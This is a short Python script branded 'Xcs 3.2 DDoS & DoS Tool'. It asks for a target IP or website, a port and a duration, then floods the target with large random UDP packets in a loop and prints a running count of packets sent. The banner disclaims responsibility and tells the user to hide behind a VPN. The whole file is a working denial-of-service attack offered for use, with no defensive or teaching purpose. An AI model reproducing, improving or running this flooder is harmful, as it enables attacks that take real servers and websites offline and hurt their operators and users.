import socket
import random
import time
import colorama

from colorama import Fore, Back, Style

print("\n" * 100)

print(Fore.CYAN + " ")
print("""
         |-----------------|
         | Xcs 3.2         |
         | DDoS & DoS      |
         | Tool            |
         | XcsV3           |
         |----[  ∆_∆  ]----|
""")

print(Fore.RED + "  ")
print(" ")
print(" ")
print("we aren't responsible to whatever thing you do using this tool, use it at your own risk.")
print(" ")
print(Fore.YELLOW + "Your ip is still visible, make sure your connected to a" + Fore.BLUE + " vpn.")
print(" ")
print(Fore.RED + "Example:  " + Fore.BLUE + "ip: 123.456.78.90 " + Fore.YELLOW + "Port: 80 (Default) " + Fore.RED + "Duration: As long as you want ")
print(" ")
print(Fore.BLUE + "Website DoS is Supported,       " + Fore.YELLOW + "Example:  ip: example.com")
print(" ")
print(Fore.GREEN + "Made By Ultra")
print(Fore.RED + " ")
print(" ")

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)



bytes = random._urandom(65500)


ip = input('Target IP: ')
port = int(input(Fore.YELLOW + 'Port: '))

duration = input(Fore.GREEN + 'Number of seconds to send packets: ')
print(Fore.RED + " ")

timeout = time.time() + float(duration)

sent = 0



while True:

	if time.time() > timeout:

		break

	else:

		pass

	sock.sendto(bytes,(ip, port))

	sent = sent + 1

	print(Fore.RED + "[+] XcsV3 " + Fore.GREEN + "Sent %s packet to %s through port %s"%(sent, ip, port))